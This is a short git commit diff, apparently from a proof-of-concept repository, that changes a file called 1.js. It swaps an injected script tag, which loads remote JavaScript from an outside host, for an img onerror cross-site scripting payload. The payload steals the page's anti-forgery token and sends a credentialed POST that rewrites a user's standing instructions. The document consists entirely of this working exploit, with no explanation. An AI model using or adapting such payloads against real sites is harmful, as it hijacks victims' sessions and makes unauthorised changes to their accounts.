ffec30242a4c25d961bf4615c25c4da09b87c51f
all3nxdPOCs <default@allenxd.com>
2026-02-03 22:55:00 +1300

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,14 @@
-<script src=https://ggez.nz/1.js></script>
+<img src=x onerror="
+var token = document.querySelector('input[name=__RequestVerificationToken]').value;
+
+fetch('/users/standingInstructions.asp', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded'
+  },
+  body: '__RequestVerificationToken=' + encodeURIComponent(token) +
+        '&uid=%7B3B7DE75F-1220-49E1-A73E-774D9F411125%7D' +
+        '&oid=&typ=&USI_Instructions=Test124567'
+});
+">
